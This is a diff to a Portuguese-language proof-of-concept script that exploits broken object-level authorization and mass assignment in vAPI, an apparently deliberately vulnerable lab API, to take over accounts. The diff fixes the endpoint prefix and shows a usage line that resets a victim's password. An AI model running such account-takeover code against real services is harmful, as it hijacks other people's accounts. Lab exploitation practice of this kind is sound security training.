@@ -3,7 +3,7 @@
 PoC - Vulnerabilidade 2: BOLA + Mass Assignment -> Account Takeover
 (API1:2023 Broken Object Level Authorization + API3:2023 Broken Object
 Property Level Authorization)
-Endpoint: PUT /api/api1/user/{id}
+Endpoint: PUT /vapi/api1/user/{id}
 Alvo: vAPI (https://github.com/roottusk/vapi)
 
 API1UsersController@update (linhas 61-62):
@@ -16,7 +16,7 @@ fazendo login com a nova senha na conta da vitima.
 
 Uso:
     pip install requests
-    python3 poc_account_takeover_put.py --url http://localhost/api \\
+    python3 poc_account_takeover_put.py --url http://localhost:8000/vapi \\
         --attacker-user jimhalp --attacker-pass 'ag4|YY~`M=Gk' \\
         --victim-id 1 --new-password "pwned123"
 """
@@ -73,7 +73,7 @@ def exploit(base_url: str, atk_user: str, atk_pass: str, victim_id: int, new_pas
 
 def main():
     parser = argparse.ArgumentParser(description="PoC Account Takeover - PUT /api1/user/{id} (vAPI)")
-    parser.add_argument("--url", default="http://localhost/api", help="Base URL da API")
+    parser.add_argument("--url", default="http://localhost:8000/vapi", help="Base URL da API, SEM o endpoint (ex: http://localhost:8000/vapi). O prefixo real de rotas do vAPI e /vapi, nao /api.")
     parser.add_argument("--attacker-user", required=True, help="Usuario valido do ATACANTE (qualquer conta de teste)")
     parser.add_argument("--attacker-pass", required=True, help="Senha do atacante")
     parser.add_argument("--victim-id", type=int, required=True, help="ID da VITIMA cujo PUT sera forjado")
